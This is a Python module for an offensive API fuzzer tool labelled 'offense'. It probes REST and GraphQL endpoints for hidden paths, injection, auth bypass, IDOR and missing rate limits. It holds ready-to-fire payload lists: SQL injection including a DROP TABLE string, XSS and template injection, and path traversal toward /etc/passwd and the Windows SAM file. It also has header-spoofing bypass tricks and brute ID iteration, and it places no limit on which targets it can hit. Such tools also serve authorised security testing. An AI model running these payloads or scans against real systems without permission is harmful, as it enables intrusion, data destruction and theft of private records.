"""AUTARCH API Fuzzer

Endpoint discovery, parameter fuzzing, auth testing, rate limit detection,
GraphQL introspection, and response analysis for REST/GraphQL APIs.
"""

DESCRIPTION = "API endpoint fuzzing & vulnerability testing"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import time
import copy
import threading
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Optional, Any, Tuple

try:
    from core.paths import get_data_dir
except ImportError:
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')

try:
    import requests
    from requests.exceptions import RequestException
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ── Fuzz Payloads ────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE--", "1; SELECT 1--",
    "' UNION SELECT NULL--", "1' AND '1'='1", "admin'--", "' OR 1=1#",
    "1 AND 1=1", "1' ORDER BY 1--", "') OR ('1'='1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg/onload=alert(1)>", "{{7*7}}",
    "${7*7}", "<%=7*7%>", "{{constructor.constructor('return 1')()}}",
]

TYPE_CONFUSION = [
    None, True, False, 0, -1, 2147483647, -2147483648,
    99999999999999, 0.1, -0.1, float('inf'),
    "", " ", "null", "undefined", "NaN", "true", "false",
    [], {}, [None], {"__proto__": {}},
    "A" * 1000, "A" * 10000,
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f",
    "/etc/passwd%00", "..%252f..%252f",
]

COMMON_ENDPOINTS = [
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/api/users', '/api/admin', '/api/login', '/api/auth',
    '/api/config', '/api/settings', '/api/debug', '/api/health',
    '/api/status', '/api/info', '/api/version', '/api/docs',
    '/api/swagger', '/api/graphql', '/api/internal',
    '/swagger.json', '/swagger-ui', '/openapi.json',
    '/api/tokens', '/api/keys', '/api/secrets',
    '/api/upload', '/api/download', '/api/export', '/api/import',
    '/api/search', '/api/query', '/api/execute', '/api/run',
    '/graphql', '/graphiql', '/playground',
    '/.well-known/openid-configuration',
    '/api/password/reset', '/api/register', '/api/verify',
    '/api/webhook', '/api/callback', '/api/notify',
    '/actuator', '/actuator/health', '/actuator/env',
    '/metrics', '/prometheus', '/_debug', '/__debug__',
]


# ── API Fuzzer Engine ────────────────────────────────────────────────────────

class APIFuzzer:
    """REST & GraphQL API security testing."""

    def __init__(self):
        self.data_dir = os.path.join(get_data_dir(), 'api_fuzzer')
        os.makedirs(self.data_dir, exist_ok=True)
        self.session = requests.Session() if HAS_REQUESTS else None
        self.results: List[Dict] = []
        self._jobs: Dict[str, Dict] = {}

    def set_auth(self, auth_type: str, value: str, header_name: str = 'Authorization'):
        """Configure authentication for requests."""
        if not self.session:
            return
        if auth_type == 'bearer':
            self.session.headers[header_name] = f'Bearer {value}'
        elif auth_type == 'api_key':
            self.session.headers[header_name] = value
        elif auth_type == 'basic':
            parts = value.split(':', 1)
            if len(parts) == 2:
                self.session.auth = (parts[0], parts[1])
        elif auth_type == 'cookie':
            self.session.cookies.set('session', value)
        elif auth_type == 'custom':
            self.session.headers[header_name] = value

    def clear_auth(self):
        """Clear authentication."""
        if self.session:
            self.session.headers.pop('Authorization', None)
            self.session.auth = None
            self.session.cookies.clear()

    # ── Endpoint Discovery ───────────────────────────────────────────────

    def discover_endpoints(self, base_url: str, custom_paths: List[str] = None,
                           threads: int = 10) -> str:
        """Discover API endpoints. Returns job_id."""
        job_id = f'discover_{int(time.time())}'
        self._jobs[job_id] = {
            'type': 'discover', 'status': 'running',
            'found': [], 'checked': 0, 'total': 0
        }

        def _discover():
            paths = COMMON_ENDPOINTS + (custom_paths or [])
            self._jobs[job_id]['total'] = len(paths)
            found = []

            def check_path(path):
                try:
                    url = urljoin(base_url.rstrip('/') + '/', path.lstrip('/'))
                    resp = self.session.get(url, timeout=5, allow_redirects=False)
                    self._jobs[job_id]['checked'] += 1

                    if resp.status_code < 404:
                        entry = {
                            'path': path,
                            'url': url,
                            'status': resp.status_code,
                            'content_type': resp.headers.get('content-type', ''),
                            'size': len(resp.content),
                            'methods': []
                        }

                        # Check allowed methods via OPTIONS
                        try:
                            opts = self.session.options(url, timeout=3)
                            allow = opts.headers.get('Allow', '')
                            if allow:
                                entry['methods'] = [m.strip() for m in allow.split(',')]
                        except Exception:
                            pass

                        found.append(entry)
                except Exception:
                    self._jobs[job_id]['checked'] += 1

            # Thread pool
            active_threads = []
            for path in paths:
                t = threading.Thread(target=check_path, args=(path,))
                t.start()
                active_threads.append(t)
                if len(active_threads) >= threads:
                    for at in active_threads:
                        at.join(timeout=10)
                    active_threads.clear()

            for t in active_threads:
                t.join(timeout=10)

            self._jobs[job_id]['found'] = found
            self._jobs[job_id]['status'] = 'complete'

        threading.Thread(target=_discover, daemon=True).start()
        return job_id

    def parse_openapi(self, url_or_path: str) -> Dict:
        """Parse OpenAPI/Swagger spec to extract endpoints."""
        try:
            if url_or_path.startswith('http'):
                resp = self.session.get(url_or_path, timeout=10)
                spec = resp.json()
            else:
                with open(url_or_path) as f:
                    spec = json.load(f)

            endpoints = []
            paths = spec.get('paths', {})
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method.upper() in ('GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'):
                        params = []
                        for p in details.get('parameters', []):
                            params.append({
                                'name': p.get('name'),
                                'in': p.get('in'),
                                'required': p.get('required', False),
                                'type': p.get('schema', {}).get('type', 'string')
                            })
                        endpoints.append({
                            'path': path,
                            'method': method.upper(),
                            'summary': details.get('summary', ''),
                            'parameters': params,
                            'tags': details.get('tags', [])
                        })

            return {
                'ok': True,
                'title': spec.get('info', {}).get('title', ''),
                'version': spec.get('info', {}).get('version', ''),
                'endpoints': endpoints,
                'count': len(endpoints)
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    # ── Parameter Fuzzing ────────────────────────────────────────────────

    def fuzz_params(self, url: str, method: str = 'GET',
                    params: Dict = None, payload_type: str = 'type_confusion') -> Dict:
        """Fuzz API parameters with various payloads."""
        if not self.session:
            return {'ok': False, 'error': 'requests not available'}

        if payload_type == 'sqli':
            payloads = SQLI_PAYLOADS
        elif payload_type == 'xss':
            payloads = XSS_PAYLOADS
        elif payload_type == 'traversal':
            payloads = TRAVERSAL_PAYLOADS
        else:
            payloads = TYPE_CONFUSION

        params = params or {}
        findings = []

        for param_name, original_value in params.items():
            for payload in payloads:
                fuzzed = copy.deepcopy(params)
                fuzzed[param_name] = payload

                try:
                    if method.upper() == 'GET':
                        resp = self.session.get(url, params=fuzzed, timeout=10)
                    else:
                        resp = self.session.request(method.upper(), url, json=fuzzed, timeout=10)

                    # Analyze response for anomalies
                    finding = self._analyze_fuzz_response(
                        resp, param_name, payload, payload_type
                    )
                    if finding:
                        findings.append(finding)

                except RequestException as e:
                    if 'timeout' not in str(e).lower():
                        findings.append({
                            'param': param_name,
                            'payload': str(payload),
                            'type': 'error',
                            'detail': str(e)
                        })

        return {'ok': True, 'findings': findings, 'tested': len(params) * len(payloads)}

    def _analyze_fuzz_response(self, resp, param: str, payload, payload_type: str) -> Optional[Dict]:
        """Analyze response for vulnerability indicators."""
        body = resp.text.lower()
        finding = None

        # SQL error detection
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'pg_query', 'sqlite3',
            'unclosed quotation', 'unterminated string', 'syntax error',
            'odbc', 'oracle error', 'microsoft ole db', 'ora-0'
        ]
        if payload_type == 'sqli' and any(e in body for e in sql_errors):
            finding = {
                'param': param, 'payload': str(payload),
                'type': 'sqli', 'severity': 'high',
                'detail': 'SQL error in response',
                'status': resp.status_code
            }

        # XSS reflection
        if payload_type == 'xss' and str(payload).lower() in body:
            finding = {
                'param': param, 'payload': str(payload),
                'type': 'xss_reflected', 'severity': 'high',
                'detail': 'Payload reflected in response',
                'status': resp.status_code
            }

        # Path traversal
        if payload_type == 'traversal':
            traversal_indicators = ['root:', '/bin/', 'windows\\system32', '[boot loader]']
            if any(t in body for t in traversal_indicators):
                finding = {
                    'param': param, 'payload': str(payload),
                    'type': 'path_traversal', 'severity': 'critical',
                    'detail': 'File content in response',
                    'status': resp.status_code
                }

        # Server error (500) might indicate injection
        if resp.status_code == 500 and not finding:
            finding = {
                'param': param, 'payload': str(payload),
                'type': 'server_error', 'severity': 'medium',
                'detail': f'Server error (500) triggered',
                'status': resp.status_code
            }

        # Stack trace / debug info disclosure
        debug_indicators = [
            'traceback', 'stacktrace', 'exception', 'debug',
            'at line', 'file "/', 'internal server error'
        ]
        if any(d in body for d in debug_indicators) and not finding:
            finding = {
                'param': param, 'payload': str(payload),
                'type': 'info_disclosure', 'severity': 'medium',
                'detail': 'Debug/stack trace in response',
                'status': resp.status_code
            }

        return finding

    # ── Auth Testing ─────────────────────────────────────────────────────

    def test_idor(self, url_template: str, id_range: Tuple[int, int],
                  auth_token: str = None) -> Dict:
        """Test for IDOR by iterating IDs."""
        findings = []
        start_id, end_id = id_range

        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'

        for i in range(start_id, end_id + 1):
            url = url_template.replace('{id}', str(i))
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    findings.append({
                        'id': i, 'url': url,
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'accessible': True
                    })
                elif resp.status_code not in (401, 403, 404):
                    findings.append({
                        'id': i, 'url': url,
                        'status': resp.status_code,
                        'accessible': False,
                        'note': f'Unexpected status: {resp.status_code}'
                    })
            except Exception:
                pass

        return {
            'ok': True, 'findings': findings,
            'accessible_count': sum(1 for f in findings if f.get('accessible')),
            'tested': end_id - start_id + 1
        }

    def test_auth_bypass(self, url: str) -> Dict:
        """Test common auth bypass techniques."""
        bypasses = []

        tests = [
            ('No auth header', {}),
            ('Empty Bearer', {'Authorization': 'Bearer '}),
            ('Bearer null', {'Authorization': 'Bearer null'}),
            ('Bearer undefined', {'Authorization': 'Bearer undefined'}),
            ('Admin header', {'X-Admin': 'true'}),
            ('Internal header', {'X-Forwarded-For': '127.0.0.1'}),
            ('Override method', {'X-HTTP-Method-Override': 'GET'}),
            ('Original URL', {'X-Original-URL': '/admin'}),
        ]

        for name, headers in tests:
            try:
                resp = requests.get(url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    bypasses.append({
                        'technique': name,
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'success': True
                    })
                else:
                    bypasses.append({
                        'technique': name,
                        'status': resp.status_code,
                        'success': False
                    })
            except Exception:
                pass

        return {
            'ok': True,
            'bypasses': bypasses,
            'successful': sum(1 for b in bypasses if b.get('success'))
        }

    # ── Rate Limiting ────────────────────────────────────────────────────

    def test_rate_limit(self, url: str, requests_count: int = 50,
                        method: str = 'GET') -> Dict:
        """Test API rate limiting."""
        results = []
        start_time = time.time()

        for i in range(requests_count):
            try:
                resp = self.session.request(method, url, timeout=10)
                results.append({
                    'request_num': i + 1,
                    'status': resp.status_code,
                    'time': time.time() - start_time,
                    'rate_limit_remaining': resp.headers.get('X-RateLimit-Remaining', ''),
                    'retry_after': resp.headers.get('Retry-After', '')
                })
                if resp.status_code == 429:
                    break
            except Exception as e:
                results.append({
                    'request_num': i + 1,
                    'error': str(e),
                    'time': time.time() - start_time
                })

        rate_limited = any(r.get('status') == 429 for r in results)
        elapsed = time.time() - start_time

        return {
            'ok': True,
            'rate_limited': rate_limited,
            'total_requests': len(results),
            'elapsed_seconds': round(elapsed, 2),
            'rps': round(len(results) / elapsed, 1) if elapsed > 0 else 0,
            'limit_hit_at': next((r['request_num'] for r in results if r.get('status') == 429), None),
            'results': results
        }

    # ── GraphQL ──────────────────────────────────────────────────────────

    def graphql_introspect(self, url: str) -> Dict:
        """Run GraphQL introspection query."""
        query = {
            'query': '''
            {
                __schema {
                    types {
                        name
                        kind
                        fields {
                            name
                            type { name kind }
                            args { name type { name } }
                        }
                    }
                    queryType { name }
                    mutationType { name }
                }
            }
            '''
        }

        try:
            resp = self.session.post(url, json=query, timeout=15)
            data = resp.json()

            if 'errors' in data and not data.get('data'):
                return {'ok': False, 'error': 'Introspection disabled or error',
                         'errors': data['errors']}

            schema = data.get('data', {}).get('__schema', {})
            types = []
            for t in schema.get('types', []):
                if not t['name'].startswith('__'):
                    types.append({
                        'name': t['name'],
                        'kind': t['kind'],
                        'fields': [
                            {'name': f['name'],
                             'type': f['type'].get('name', f['type'].get('kind', '')),
                             'args': [a['name'] for a in f.get('args', [])]}
                            for f in (t.get('fields') or [])
                        ]
                    })

            return {
                'ok': True,
                'query_type': schema.get('queryType', {}).get('name'),
                'mutation_type': schema.get('mutationType', {}).get('name'),
                'types': types,
                'type_count': len(types)
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def graphql_depth_test(self, url: str, max_depth: int = 10) -> Dict:
        """Test GraphQL query depth limits."""
        results = []
        for depth in range(1, max_depth + 1):
            # Build nested query
            inner = '{ __typename }'
            for _ in range(depth):
                inner = f'{{ __schema {{ types {inner} }} }}'

            try:
                resp = self.session.post(url, json={'query': inner}, timeout=10)
                results.append({
                    'depth': depth,
                    'status': resp.status_code,
                    'has_errors': 'errors' in resp.json() if resp.headers.get('content-type', '').startswith('application/json') else None
                })
                if resp.status_code != 200:
                    break
            except Exception:
                results.append({'depth': depth, 'error': True})
                break

        max_allowed = max((r['depth'] for r in results if r.get('status') == 200), default=0)
        return {
            'ok': True,
            'max_depth_allowed': max_allowed,
            'depth_limited': max_allowed < max_depth,
            'results': results
        }

    # ── Response Analysis ────────────────────────────────────────────────

    def analyze_response(self, url: str, method: str = 'GET') -> Dict:
        """Analyze API response for security issues."""
        try:
            resp = self.session.request(method, url, timeout=10)
            issues = []

            # Check security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY|SAMEORIGIN',
                'Strict-Transport-Security': None,
                'Content-Security-Policy': None,
                'X-XSS-Protection': None,
            }
            for header, expected in security_headers.items():
                val = resp.headers.get(header)
                if not val:
                    issues.append({
                        'type': 'missing_header',
                        'header': header,
                        'severity': 'low'
                    })

            # Check for info disclosure
            server = resp.headers.get('Server', '')
            if server and any(v in server.lower() for v in ['apache/', 'nginx/', 'iis/']):
                issues.append({
                    'type': 'server_disclosure',
                    'value': server,
                    'severity': 'info'
                })

            powered_by = resp.headers.get('X-Powered-By', '')
            if powered_by:
                issues.append({
                    'type': 'technology_disclosure',
                    'value': powered_by,
                    'severity': 'low'
                })

            # Check CORS
            cors = resp.headers.get('Access-Control-Allow-Origin', '')
            if cors == '*':
                issues.append({
                    'type': 'open_cors',
                    'value': cors,
                    'severity': 'medium'
                })

            # Check for error/debug info in body
            body = resp.text.lower()
            if any(kw in body for kw in ['stack trace', 'traceback', 'debug mode']):
                issues.append({
                    'type': 'debug_info',
                    'severity': 'medium',
                    'detail': 'Debug/stack trace information in response'
                })

            return {
                'ok': True,
                'url': url,
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'issues': issues,
                'issue_count': len(issues)
            }

        except Exception as e:
            return {'ok': False, 'error': str(e)}

    # ── Job Management ───────────────────────────────────────────────────

    def get_job(self, job_id: str) -> Optional[Dict]:
        return self._jobs.get(job_id)

    def list_jobs(self) -> List[Dict]:
        return [{'id': k, **v} for k, v in self._jobs.items()]


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None

def get_api_fuzzer() -> APIFuzzer:
    global _instance
    if _instance is None:
        _instance = APIFuzzer()
    return _instance


# ── CLI Interface ────────────────────────────────────────────────────────────

def run():
    """CLI entry point for API Fuzzer module."""
    if not HAS_REQUESTS:
        print("  Error: requests library not installed")
        return

    fuzzer = get_api_fuzzer()

    while True:
        print(f"\n{'='*60}")
        print(f"  API Fuzzer")
        print(f"{'='*60}")
        print()
        print("  1 — Discover Endpoints")
        print("  2 — Parse OpenAPI Spec")
        print("  3 — Fuzz Parameters")
        print("  4 — Test Auth Bypass")
        print("  5 — Test IDOR")
        print("  6 — Test Rate Limiting")
        print("  7 — GraphQL Introspection")
        print("  8 — Analyze Response")
        print("  9 — Set Authentication")
        print("  0 — Back")
        print()

        choice = input("  > ").strip()

        if choice == '0':
            break
        elif choice == '1':
            base = input("  Base URL: ").strip()
            if base:
                job_id = fuzzer.discover_endpoints(base)
                print(f"    Discovery started (job: {job_id})")
                while True:
                    job = fuzzer.get_job(job_id)
                    if job['status'] == 'complete':
                        print(f"    Found {len(job['found'])} endpoints:")
                        for ep in job['found']:
                            print(f"      [{ep['status']}] {ep['path']}  "
                                  f"({ep['content_type'][:30]})")
                        break
                    print(f"    Checking... {job['checked']}/{job['total']}")
                    time.sleep(1)
        elif choice == '2':
            url = input("  OpenAPI spec URL or file: ").strip()
            if url:
                result = fuzzer.parse_openapi(url)
                if result['ok']:
                    print(f"    API: {result['title']} v{result['version']}")
                    print(f"    Endpoints: {result['count']}")
                    for ep in result['endpoints'][:20]:
                        print(f"      {ep['method']:<6} {ep['path']}  {ep.get('summary', '')}")
                else:
                    print(f"    Error: {result['error']}")
        elif choice == '3':
            url = input("  Endpoint URL: ").strip()
            param_str = input("  Parameters (key=val,key=val): ").strip()
            ptype = input("  Payload type (sqli/xss/traversal/type_confusion): ").strip() or 'type_confusion'
            if url and param_str:
                params = dict(p.split('=', 1) for p in param_str.split(',') if '=' in p)
                result = fuzzer.fuzz_params(url, params=params, payload_type=ptype)
                if result['ok']:
                    print(f"    Tested {result['tested']} combinations, {len(result['findings'])} findings:")
                    for f in result['findings']:
                        print(f"      [{f.get('severity', '?')}] {f['type']}: {f['param']} = {f['payload'][:50]}")
        elif choice == '4':
            url = input("  Protected URL: ").strip()
            if url:
                result = fuzzer.test_auth_bypass(url)
                print(f"    Tested {len(result['bypasses'])} techniques, {result['successful']} successful")
                for b in result['bypasses']:
                    status = 'BYPASSED' if b['success'] else f'blocked ({b["status"]})'
                    print(f"      {b['technique']}: {status}")
        elif choice == '6':
            url = input("  URL to test: ").strip()
            count = input("  Request count (default 50): ").strip()
            if url:
                result = fuzzer.test_rate_limit(url, int(count) if count.isdigit() else 50)
                print(f"    Rate limited: {result['rate_limited']}")
                print(f"    RPS: {result['rps']} | Total: {result['total_requests']} in {result['elapsed_seconds']}s")
                if result['limit_hit_at']:
                    print(f"    Limit hit at request #{result['limit_hit_at']}")
        elif choice == '7':
            url = input("  GraphQL URL: ").strip()
            if url:
                result = fuzzer.graphql_introspect(url)
                if result['ok']:
                    print(f"    Found {result['type_count']} types")
                    for t in result['types'][:10]:
                        print(f"      {t['kind']}: {t['name']} ({len(t['fields'])} fields)")
                else:
                    print(f"    Error: {result['error']}")
        elif choice == '8':
            url = input("  URL: ").strip()
            if url:
                result = fuzzer.analyze_response(url)
                if result['ok']:
                    print(f"    Status: {result['status']} | Issues: {result['issue_count']}")
                    for issue in result['issues']:
                        print(f"      [{issue['severity']}] {issue['type']}: {issue.get('value', issue.get('detail', ''))}")
        elif choice == '9':
            auth_type = input("  Auth type (bearer/api_key/basic/cookie): ").strip()
            value = input("  Value: ").strip()
            if auth_type and value:
                fuzzer.set_auth(auth_type, value)
                print("    Authentication configured")
